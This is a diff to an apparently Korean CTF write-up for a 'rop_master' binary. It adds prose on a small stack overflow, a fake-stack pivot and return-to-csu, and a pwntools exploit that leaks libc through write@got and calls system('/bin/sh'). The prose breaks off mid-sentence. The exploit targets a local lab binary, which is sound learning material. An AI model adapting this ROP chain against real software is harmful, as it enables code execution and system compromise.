@@ -207,7 +207,13 @@ p.interactive()
 
 ## 3 rop_master
 
-rop 문제로, 0x16만큼의 bof가 난다.
+16만큼의 bof가 나기 때문에 ret 주소까지밖에 덮을 수 없으므로 다른 방식으로 rop를 진행해야 한다. stack에는 NX bit로 인해 실행 권한이 없으므로 name이 저장된 data 영역에 fake stack을 구성한다. fake stack에서 write함수를 통해 write함수를 구해 와야 하는데, pop_rdx gadget이 바이너리에 없으므로 return to csu 기법을 이용해야 한다. rtc를 이용하여 r
+
+
+
+read, write, name
+
+
 
 ```python
 from pwn import *
@@ -216,23 +222,91 @@ p = process('./rop_master')
 e = ELF('./rop_master')
 libc = e.libc
 
+bss = e.bss() + 0x400
 
+csu1 = 0x4005f0
+csu2 = 0x400606
 read_plt = 0x400440 
 read_got = 0x601020
 write_plt = 0x400430
 write_got =  0x601018
-
+main = 0x0000000000400537
+name = 0x00007ffff7faffe0
 pop_rdi = 0x00400613
 
-p.send(b'/bin/sh')
 
+p.recvuntil(b"Your name : ")
+
+#1 write(1, write_got, 8) in name
+payload = b'A'*0x8
+payload += p64(csu2)
+payload += b'B'*0x8
+payload += p64(0) #rbx
+payload += p64(1) #rbp
+payload += p64(write_got) #r12
+payload += p64(1) #r13->edi
+payload += p64(write_got) #r14->rsi
+payload += p64(8) #r15->rdx
+payload += p64(csu1)
+
+p.send(payload)
+
+
+p.recvuntil(b"Can you rop it?\n")
+
+#2 stack pivot & main return
 payload = b'A'*0x100
-payload += 
+payload += p64(name)
+payload += p64(main)
+
+p.send(payload)
 
 
+p.recvuntil(b"Your name : ")
+
+#3 send name
+payload = b'A'*0x8
+
+p.send(payload)
+
+
+p.recvuntil(b"Can you rop it?\n")
+
+#4 stack pivot & main return
+payload = b'A'*0x100
+payload += p64(name)
+payload += p64(main)
+
+p.send(payload)
+
+
+write_offset = libc.symbols['write']
+system_offset = libc.symbols['system']
+write_addr = u64(p.recv(8).ljust(8, '\x00'))
+libc_base = write_addr - write_offset
+system_addr = libc_base + system_offset
+binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
+
+
+p.recvuntil(b"Your name : ")
+
+#5 system('/bin/sh')
+payload = b'A'*0x8
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(0x00400416) #ret
+payload += p64(system_addr)
 
 
 p.send(payload)
+
+#6 stack pivot & main return
+payload = b'A'*0x100
+payload += p64(name)
+payload += p64(main)
+
+p.send(payload)
+
 
 p.interactive()
 
